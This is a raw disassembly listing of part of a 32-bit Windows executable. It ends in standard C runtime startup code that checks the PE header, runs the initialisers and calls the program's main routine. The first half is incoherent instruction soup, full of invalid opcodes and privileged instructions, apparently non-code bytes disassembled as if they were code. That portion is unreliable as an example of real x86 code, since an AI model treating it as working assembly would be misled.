  42235f:	mov    ebp,0xbd5fa842
  422364:	inc    edx
  422365:	frstor [ecx-0x1b2f55a7]
  42236b:	cmc    
  42236c:	mov    edx,0x9bbb73e6
  422371:	mov    bl,0xb9
  422373:	ret    
  422374:	push   ss
  422375:	enter  0xcb32,0xa3
  422379:	test   DWORD PTR [edx+0x20077ef8],edi
  42237f:	imul   edx,DWORD PTR [ebp-0x78],0xb9372911
  422386:	or     esi,esp
  422388:	mov    al,ds:0x75554a64
  42238d:	imul   eax,DWORD PTR [eax-0x30d9d9df],0x2a
  422394:	lahf   
  422395:	sar    BYTE PTR [edx-0x6b],cl
  422398:	jge    0x4223ba
  42239a:	dec    edx
  42239b:	fidiv  DWORD PTR [edx]
  42239d:	and    eax,0x9d7d7f3e
  4223a2:	jge    0x42239e
  4223a4:	pusha  
  4223a5:	jg     0x42236d
  4223a7:	sti    
  4223a8:	inc    esi
  4223a9:	stos   DWORD PTR es:[edi],eax
  4223aa:	xchg   ecx,eax
  4223ab:	dec    esi
  4223ac:	inc    eax
  4223ad:	sar    DWORD PTR [eax-0x42],1
  4223b0:	nop
  4223b1:	push   edi
  4223b2:	imul   edi,DWORD PTR [edi],0x8d0e92b9
  4223b8:	stc    
  4223b9:	(bad)  [ebp+0x32eb0f72]
  4223bf:	sub    BYTE PTR [ecx],bl
  4223c1:	or     eax,0x366ba450
  4223c6:	call   0xfccdceac
  4223cb:	jae    0x422401
  4223cd:	xor    DWORD PTR [edi],ecx
  4223cf:	int3   
  4223d0:	shr    BYTE PTR [edi+0x21],0x6a
  4223d4:	or     eax,0x598616a2
  4223d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223da:	jns    0x4223b2
  4223dc:	inc    ebp
  4223dd:	sbb    BYTE PTR [ebx+0x3e],0xc2
  4223e1:	pop    ebx
  4223e2:	stos   BYTE PTR es:[edi],al
  4223e3:	call   0xeffebf70
  4223e8:	pop    ebx
  4223e9:	enter  0x7596,0xea
  4223ed:	dec    ebp
  4223ee:	jle    0x422457
  4223f0:	das    
  4223f1:	scas   eax,DWORD PTR es:[edi]
  4223f2:	mov    cl,0x31
  4223f4:	and    ecx,DWORD PTR [ecx]
  4223f6:	push   edx
  4223f7:	adc    DWORD PTR [esi+0x48a7d08c],esi
  4223fd:	repnz inc edx
  4223ff:	mov    eax,0x9b4742fe
  422404:	imul   edi,DWORD PTR [esi+0xd],0xffffffa0
  422408:	ds push ecx
  42240a:	jno    0x4223c0
  42240c:	in     al,dx
  42240d:	js     0x422442
  42240f:	adc    BYTE PTR [edi-0xd940f7b],dl
  422415:	push   0x8126fd35
  42241a:	sub    BYTE PTR [ebp+0x26],dh
  42241d:	sub    bl,BYTE PTR [ecx+0x1b8b5e7e]
  422423:	pop    ebp
  422424:	sbb    DWORD PTR [eax],esi
  422426:	pop    es
  422427:	loop   0x422484
  422429:	shr    BYTE PTR [ebx],cl
  42242b:	push   ebx
  42242c:	(bad)  
  42242d:	cli    
  42242e:	push   ss
  42242f:	push   ebx
  422430:	adc    eax,0x7039ed17
  422435:	cmp    DWORD PTR [edi+0x3c],eax
  422438:	push   eax
  422439:	and    DWORD PTR [ecx],edx
  42243b:	mov    eax,ds:0x588d8bc
  422440:	dec    ecx
  422441:	cmp    cl,BYTE PTR [ebx+esi*4+0x6e]
  422445:	pop    edi
  422446:	mov    eax,ds:0x8f5d3d2c
  42244b:	xor    BYTE PTR [esi+edx*1-0x4f2fd561],cl
  422452:	jg     0x42246b
  422454:	retf   
  422455:	ficom  WORD PTR [eax+0x2b]
  422458:	out    0x29,eax
  42245a:	mov    ch,0xbc
  42245c:	fyl2xp1 
  42245e:	push   esp
  42245f:	push   esp
  422460:	add    ch,BYTE PTR [ebp-0x67]
  422463:	fwait
  422464:	sub    dh,bl
  422466:	stos   BYTE PTR es:[edi],al
  422467:	sbb    ah,dl
  422469:	aaa    
  42246a:	ja     0x4223fe
  42246c:	cmp    ebx,edi
  42246e:	(bad)  [ecx+0x12]
  422471:	mov    eax,ds:0xde2fdc1e
  422476:	imul   di,WORD PTR [eax-0x5f],0x51
  42247b:	mov    bh,0x6f
  42247d:	add    al,0xfc
  42247f:	imul   eax,DWORD PTR [ebp+ebp*2+0x25],0x4a
  422484:	or     BYTE PTR [edx-0x7b],dh
  422487:	jle    0x4224d7
  422489:	(bad)  
  42248a:	lock rdmsr 
  42248d:	xor    esi,DWORD PTR [edx-0x76f1d9c6]
  422493:	mov    ebx,0x264c631e
  422498:	ret    0xe750
  42249b:	or     DWORD PTR [ecx-0x4c],esi
  42249e:	stos   DWORD PTR es:[edi],eax
  42249f:	xor    eax,0xe13d4cd6
  4224a4:	mov    eax,ds:0x61c9b5f7
  4224a9:	daa    
  4224aa:	retf   0x74d9
  4224ad:	dec    edx
  4224ae:	lods   al,BYTE PTR ds:[esi]
  4224af:	bndldx bnd1,[ebx+ecx*8]
  4224b3:	mov    ds,WORD PTR [esi-0x80]
  4224b6:	add    BYTE PTR [eax-0x80],ah
  4224b9:	add    cl,BYTE PTR [ebx]
  4224bb:	in     al,dx
  4224bc:	nop
  4224bd:	pop    esp
  4224be:	cmp    eax,0x73975cba
  4224c3:	shl    DWORD PTR [edi-0x33],cl
  4224c6:	dec    ebp
  4224c7:	ret    
  4224c8:	imul   ebp,DWORD PTR [ebp-0x56],0xffffffc1
  4224cc:	div    BYTE PTR [edx-0x356a275b]
  4224d2:	mov    esi,ecx
  4224d4:	lahf   
  4224d5:	repnz call 0x7eac:0x704335eb
  4224dd:	pop    edx
  4224de:	mov    ch,0xf8
  4224e0:	cmp    al,0xfb
  4224e2:	mov    dh,0x32
  4224e4:	mov    bl,0x44
  4224e6:	in     eax,0x88
  4224e8:	sahf   
  4224e9:	pop    esi
  4224ea:	rol    BYTE PTR [eax+eiz*8],0xb5
  4224ee:	mov    dh,0x7a
  4224f0:	lahf   
  4224f1:	shl    BYTE PTR [esi+0x65],0x40
  4224f5:	retf   
  4224f6:	add    al,BYTE PTR [eax-0x3e]
  4224f9:	cs cwde 
  4224fb:	and    al,BYTE PTR [esi+0x7d]
  4224fe:	adc    BYTE PTR [edx-0x7c],bl
  422501:	inc    esp
  422502:	stc    
  422503:	cmp    al,0x6e
  422505:	aaa    
  422506:	sub    DWORD PTR [esi+0x4d],ebx
  422509:	inc    esi
  42250a:	sbb    DWORD PTR [esi],0x4e8e389a
  422510:	mov    BYTE PTR [eax+esi*2-0x7b],bh
  422514:	fcmovbe st,st(4)
  422516:	mov    ch,0x18
  422518:	push   esi
  422519:	push   0xffffffbb
  42251b:	jne    0x422562
  42251d:	mov    BYTE PTR [ebp+0x3a09d0ea],ch
  422523:	mov    edx,0x62a79544
  422528:	mov    dh,0x29
  42252a:	je     0x42252e
  42252c:	add    edx,edi
  42252e:	arpl   ax,bx
  422530:	popa   
  422531:	addr16 pop ebp
  422533:	sub    BYTE PTR ds:0xf9da7e42,dl
  422539:	xchg   edx,eax
  42253a:	fs in  eax,0x4e
  42253d:	inc    eax
  42253e:	mov    esp,DWORD PTR [ebx+0x4dfa292f]
  422544:	and    edx,DWORD PTR fs:[ebp-0x443ca16a]
  42254b:	popa   
  42254c:	call   0xce8e:0xbc1bcf1d
  422553:	aam    0x4d
  422555:	dec    edx
  422556:	or     DWORD PTR [eax+ebp*8-0x77],ebx
  42255a:	add    dl,BYTE PTR [esp+eax*1+0x28a832d5]
  422561:	mov    al,ds:0xb0299e8b
  422566:	or     dh,bh
  422568:	outs   dx,DWORD PTR ds:[esi]
  422569:	jmp    0x42257d
  42256b:	loop   0x422570
  42256d:	aam    0x4d
  42256f:	jl     0x422569
  422571:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422572:	push   edx
  422573:	imul   edi,DWORD PTR cs:[edx],0x1a
  422577:	xchg   DWORD PTR ds:0xc2eb3c2e,edx
  42257d:	jo     0x4225b7
  42257f:	sbb    eax,0x6db280d7
  422584:	mov    eax,ds:0x29d70473
  422589:	mov    eax,0x9e64c6ba
  42258e:	xchg   BYTE PTR [ebx],ah
  422590:	(bad)  
  422591:	jmp    0xc47e:0xc0d1ff64
  422598:	pop    es
  422599:	(bad)  
  42259b:	(bad)  
  42259c:	std    
  42259d:	test   eax,0xf0bc911b
  4225a3:	add    al,0x59
  4225a5:	mov    dh,0xf8
  4225a7:	sbb    cl,BYTE PTR [edx]
  4225a9:	mov    ch,0xe2
  4225ab:	iret   
  4225ac:	xchg   ecx,eax
  4225ad:	and    ah,dh
  4225af:	fdiv   QWORD PTR [edi+edx*1-0x6b802dc9]
  4225b6:	fisub  DWORD PTR [ebx+ebp*2]
  4225b9:	popa   
  4225ba:	bt     DWORD PTR [ecx+eiz*4+0x7f],ebp
  4225bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225c0:	es push edi
  4225c2:	inc    ebp
  4225c3:	call   0x6557c132
  4225c8:	inc    eax
  4225c9:	sahf   
  4225ca:	xchg   ebp,eax
  4225cb:	ja     0x42258a
  4225cd:	pop    eax
  4225ce:	cli    
  4225cf:	push   0xffffff98
  4225d1:	jne    0x42262f
  4225d3:	jmp    0x42255f
  4225d5:	sbb    DWORD PTR [ebx+ebp*8],edi
  4225d8:	mov    ch,0x48
  4225da:	jb     0x4225c6
  4225dc:	add    cl,BYTE PTR [ebp+eax*1-0x1d921cd4]
  4225e3:	sahf   
  4225e4:	mov    bh,0x6a
  4225e6:	mov    BYTE PTR [ebp+0x1d1739e8],ch
  4225ec:	jbe    0x422642
  4225ee:	adc    esp,DWORD PTR [esi-0x46097fee]
  4225f4:	add    al,0xb0
  4225f6:	(bad)  
  4225f7:	sub    BYTE PTR [edx-0x4835f700],dh
  4225fd:	adc    al,0xbc
  4225ff:	std    
  422600:	mov    esp,0x4d4b21a1
  422605:	xor    al,0xbf
  422607:	xlat   BYTE PTR ds:[ebx]
  422608:	mov    ds,WORD PTR ds:0x62f56ce3
  42260e:	xor    ch,BYTE PTR [edx-0x11]
  422611:	popf   
  422612:	cmp    BYTE PTR [edx],al
  422614:	outs   dx,DWORD PTR ds:[esi]
  422615:	xchg   BYTE PTR [ebx+ebx*8+0x3c34e6ea],al
  42261c:	test   al,0xa
  42261e:	out    0x1c,al
  422620:	jae    0x4225eb
  422622:	lods   eax,DWORD PTR ds:[esi]
  422623:	ja     0x422688
  422625:	sbb    al,0xbc
  422627:	push   ecx
  422628:	dec    edx
  422629:	xchg   esi,eax
  42262a:	hlt    
  42262b:	mov    DWORD PTR [ecx],0x49636d59
  422631:	mov    al,ds:0x5bbfda95
  422636:	out    0x2d,al
  422638:	test   eax,0xa80486a9
  42263d:	dec    edi
  42263e:	mov    al,0xc3
  422640:	in     al,dx
  422641:	jo     0x4225f3
  422643:	pop    ecx
  422644:	inc    DWORD PTR [ebp-0x783fb6e7]
  42264a:	sub    eax,0x7d91f45
  42264f:	pushf  
  422650:	mov    fs,WORD PTR [ebx+0x7c15c548]
  422656:	shl    DWORD PTR [ebp-0x4ccad67e],cl
  42265c:	shl    BYTE PTR [edi+0x7e],cl
  42265f:	dec    esp
  422660:	mov    bl,0x5f
  422662:	dec    edi
  422663:	cmp    eax,0x43773381
  422668:	and    DWORD PTR [ecx+0x19c8e4e8],0xffffffe8
  42266f:	fwait
  422670:	(bad)  
  422671:	sbb    esp,DWORD PTR [edi*4-0x359cbba]
  422678:	gs enter 0x214c,0x43
  42267d:	out    dx,eax
  42267e:	neg    bh
  422680:	adc    BYTE PTR [ebx],0x92
  422683:	ret    
  422684:	ins    BYTE PTR es:[edi],dx
  422685:	push   eax
  422686:	push   ebx
  422687:	outs   dx,DWORD PTR ds:[esi]
  422688:	out    0xf9,eax
  42268a:	test   DWORD PTR [bx+di],ebx
  42268d:	mov    dl,0x81
  42268f:	or     DWORD PTR [ecx],0x5ff0bb49
  422695:	ins    BYTE PTR es:[edi],dx
  422696:	and    DWORD PTR [edi+0x36551680],0xffffffa8
  42269d:	int3   
  42269e:	and    BYTE PTR [eax+0x346aea4a],ah
  4226a4:	pop    edi
  4226a5:	jmp    0x42268a
  4226a7:	and    ebx,ebx
  4226a9:	lea    edx,[edx-0x60]
  4226ac:	inc    BYTE PTR [esi+0x4e5a4109]
  4226b2:	imul   DWORD PTR [edx-0x6d]
  4226b5:	inc    eax
  4226b6:	dec    esi
  4226b7:	cmp    eax,0xbcd8f6ab
  4226bc:	mov    ebx,ebp
  4226be:	fld    TBYTE PTR [ebx-0x77]
  4226c1:	pop    ebp
  4226c2:	or     eax,0x9236c58e
  4226c7:	inc    edi
  4226c8:	add    DWORD PTR [ebp+0x5e53bc83],esi
  4226ce:	vpacksswb xmm7,xmm5,XMMWORD PTR [ebx+0x74]
  4226d3:	mov    dh,BYTE PTR [esi-0x53]
  4226d6:	out    dx,eax
  4226d7:	and    al,bh
  4226d9:	adc    BYTE PTR [eax+0x67f7317],ch
  4226df:	ret    0x1c10
  4226e2:	dec    edi
  4226e3:	push   ss
  4226e4:	add    eax,0x832477be
  4226e9:	mov    ch,0x52
  4226eb:	sbb    al,0x27
  4226ed:	test   DWORD PTR [esp+ecx*2+0x2c],0x1b27c5bc
  4226f5:	lea    edx,[eax+0x3a540562]
  4226fb:	add    BYTE PTR [ebp-0x7b],ch
  4226fe:	adc    DWORD PTR [edx+0x36f34814],esi
  422704:	scas   eax,DWORD PTR es:[edi]
  422705:	pop    edx
  422706:	and    al,0x5f
  422708:	jmp    0xd822:0xd7104f8b
  42270f:	mov    edx,0x47ce342c
  422714:	dec    ebp
  422715:	xchg   esp,eax
  422716:	ins    DWORD PTR es:[edi],dx
  422717:	out    0x50,eax
  422719:	addr16 aas 
  42271b:	add    eax,0x7355f75e
  422720:	and    eax,0xef3f5b07
  422725:	adc    DWORD PTR [esi],0xffffffc5
  422728:	jle    0x422710
  42272a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42272b:	sbb    ebx,eax
  42272d:	sub    BYTE PTR [edx+0x692570ae],dh
  422733:	div    DWORD PTR [esp+ecx*2+0x3d]
  422737:	push   0xffffffae
  422739:	jp     0x4226bd
  42273b:	cmp    DWORD PTR [ebp+0x497c3f2d],esi
  422741:	dec    edx
  422742:	push   ebx
  422743:	mov    edx,0x177d9b4e
  422748:	inc    edi
  422749:	or     ecx,DWORD PTR [eax]
  42274b:	dec    ebp
  42274c:	push   es
  42274d:	sbb    DWORD PTR [ebx-0x243d2377],0x7732910e
  422757:	cli    
  422758:	sbb    DWORD PTR [ebp+eiz*8-0x401960b4],0xdbaf1ca8
  422763:	add    eax,0x666286f0
  422768:	rol    BYTE PTR [eax+edi*1],0xb
  42276c:	sbb    ebx,esi
  42276e:	rol    BYTE PTR [eax],cl
  422770:	jmp    0xc4:0xf26c7515
  422777:	jno    0x422718
  422779:	push   cs
  42277a:	jg     0x422787
  42277c:	call   esi
  42277e:	jae    0x4227ac
  422780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422781:	sbb    esp,DWORD PTR [esi]
  422783:	test   BYTE PTR [eax-0x2f],dh
  422786:	lods   al,BYTE PTR ds:[esi]
  422787:	(bad)  
  422788:	imul   ebx,edx,0x426faa19
  42278e:	rcl    DWORD PTR [esi-0x14dd98fa],cl
  422794:	lahf   
  422795:	add    eax,0x9ac1bf16
  42279a:	cld    
  42279b:	std    
  42279c:	mov    cl,bl
  42279e:	sbb    DWORD PTR [edi+0x4d8f17d5],edi
  4227a4:	push   ecx
  4227a5:	outs   dx,DWORD PTR cs:[esi]
  4227a7:	cmp    eax,0xb2e09b00
  4227ac:	pop    ds
  4227ad:	jmp    0x42278d
  4227af:	mov    cs,WORD PTR [ecx-0x1e4756fe]
  4227b5:	cdq    
  4227b6:	push   ds
  4227b7:	lock imul ebx,DWORD PTR [edi+0x55],0xb5f63f9e
  4227bf:	sub    cl,BYTE PTR [edx-0x76ab7a8d]
  4227c5:	cld    
  4227c6:	jmp    0xed97fb20
  4227cb:	mov    eax,0x999e1ae6
  4227d0:	push   esp
  4227d1:	loop   0x42280d
  4227d3:	adc    eax,0x4b4ff8ef
  4227d8:	cmc    
  4227d9:	lods   al,BYTE PTR ds:[esi]
  4227da:	inc    ebx
  4227db:	hlt    
  4227dc:	mov    al,ds:0x5ce8fbf
  4227e1:	cli    
  4227e2:	shl    DWORD PTR [esi-0x599580e1],0xc6
  4227e9:	stc    
  4227ea:	rcr    DWORD PTR [eax-0x80],0x80
  4227ee:	rcr    ecx,0x7f
  4227f1:	push   edx
  4227f2:	and    edi,DWORD PTR [ebx+eax*8-0x4a]
  4227f6:	jae    0x42278e
  4227f8:	mov    cl,0xb9
  4227fa:	loopne 0x4227c6
  4227fc:	jmp    0x4ba1:0xf3115e7a
  422803:	mov    edi,0xcfdc7663
  422808:	push   ecx
  422809:	mov    edx,0x16ba3b19
  42280e:	out    0xf8,al
  422810:	jns    0x4227c7
  422812:	cmp    esi,DWORD PTR ds:0xc681ef3e
  422818:	dec    esi
  422819:	lock add al,0xad
  42281c:	bnd call 0x272db0c1
  422822:	in     eax,0x54
  422824:	xchg   ebp,eax
  422825:	xor    BYTE PTR [ecx+0x4a6f7b56],bh
  42282b:	test   BYTE PTR es:[edi+edx*1-0xd0bf1e3],bl
  422833:	add    dl,BYTE PTR [ecx]
  422835:	cwde   
  422836:	cmp    BYTE PTR [esi+0x66b82835],0x99
  42283d:	icebp  
  42283e:	popa   
  42283f:	mov    ch,0xd5
  422841:	mov    BYTE PTR ds:0x7e1ff92b,cl
  422847:	mov    ecx,0x8a88dd92
  42284c:	inc    edi
  42284d:	call   0x33ada1eb
  422852:	fst    DWORD PTR [edx+0x29]
  422855:	mov    eax,0xae5a0455
  42285a:	cmp    ch,dh
  42285c:	fwait
  42285d:	cmp    al,cl
  42285f:	or     bh,BYTE PTR [ecx+0x22]
  422862:	xchg   edi,eax
  422863:	pop    esp
  422864:	xor    eax,0x3abf46d2
  422869:	sub    eax,0x72cafe31
  42286e:	sub    al,0xbd
  422870:	pop    ebx
  422871:	neg    BYTE PTR [esi+0xa5e2880]
  422877:	cdq    
  422878:	test   BYTE PTR [ecx+0x2382aad9],ah
  42287e:	fist   WORD PTR [esi]
  422880:	scas   al,BYTE PTR es:[edi]
  422881:	fisub  DWORD PTR [edx+0x2ee4dba8]
  422887:	sub    DWORD PTR [ecx-0x60],ecx
  42288a:	cmp    BYTE PTR [ecx+eiz*4],0x7c
  42288e:	jnp    0x422881
  422890:	cmp    bh,BYTE PTR [ebx]
  422892:	mov    eax,0x16fada4d
  422897:	push   edx
  422898:	fwait
  422899:	sub    eax,0x7c1b4a9a
  42289e:	in     eax,dx
  42289f:	jmp    0x8baf5dcb
  4228a4:	mov    ds:0xfdadc9a3,al
  4228a9:	mov    BYTE PTR [ecx-0x47f029e9],ch
  4228af:	adc    esp,edi
  4228b1:	lods   eax,DWORD PTR ds:[esi]
  4228b2:	xbegin 0xb14b192f
  4228b8:	add    DWORD PTR [edx-0x57dceac2],eax
  4228be:	test   DWORD PTR [ebx-0x52],esi
  4228c1:	xchg   ebp,eax
  4228c2:	inc    edx
  4228c3:	or     BYTE PTR [edx-0x408d5fa],dl
  4228c9:	sbb    BYTE PTR [ebp+0xa2fff24],dh
  4228cf:	test   al,0xe7
  4228d1:	outs   dx,BYTE PTR ds:[esi]
  4228d2:	lahf   
  4228d3:	mov    esi,0xd81305f8
  4228d8:	cli    
  4228d9:	cmp    ebp,DWORD PTR [edx+0x1185cade]
  4228df:	add    eax,0xf404d138
  4228e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4228e5:	cmp    bh,BYTE PTR [ebx+0x64]
  4228e8:	adc    dl,BYTE PTR ds:0xb6b91a57
  4228ee:	add    al,0x66
  4228f0:	jmp    0x6d14fea3
  4228f5:	sahf   
  4228f6:	add    al,0x3b
  4228f8:	or     esi,esp
  4228fa:	lods   al,BYTE PTR ds:[esi]
  4228fb:	sub    BYTE PTR [ebx],0x72
  4228fe:	or     al,0xf3
  422900:	les    esi,FWORD PTR [eax+0x346af7cd]
  422906:	push   ebx
  422907:	xlat   BYTE PTR es:[ebx]
  422909:	or     ah,BYTE PTR [ecx]
  42290b:	mov    WORD PTR [edi],?
  42290d:	stos   DWORD PTR es:[edi],eax
  42290e:	inc    esp
  42290f:	cmp    eax,0x83abb320
  422914:	mov    ch,0x92
  422916:	jb     0x4228b9
  422918:	add    dh,BYTE PTR [edx-0x164af846]
  42291e:	iret   
  42291f:	lods   eax,DWORD PTR ds:[esi]
  422920:	nop
  422921:	div    bl
  422923:	and    eax,0x6ecc7e36
  422928:	(bad)  
  422929:	push   esp
  42292a:	add    cl,0x3d
  42292d:	sub    BYTE PTR [esi],0xa5
  422930:	or     edx,ebx
  422932:	cmp    eax,0xcfd43568
  422937:	(bad)  
  422938:	int3   
  422939:	push   ds
  42293a:	mov    eax,ds:0xeb56b10b
  42293f:	sbb    BYTE PTR [ebx+0x2c],al
  422942:	add    al,0x57
  422944:	(bad)  
  422945:	push   edi
  422946:	dec    ecx
  422947:	lds    ebx,FWORD PTR [esi+0x514a10d6]
  42294d:	xchg   DWORD PTR [ebp+0x1f],edi
  422950:	add    DWORD PTR [ebx+edx*8-0xa],ecx
  422954:	adc    bl,BYTE PTR [ebx-0x7524644a]
  42295a:	xor    eax,eax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
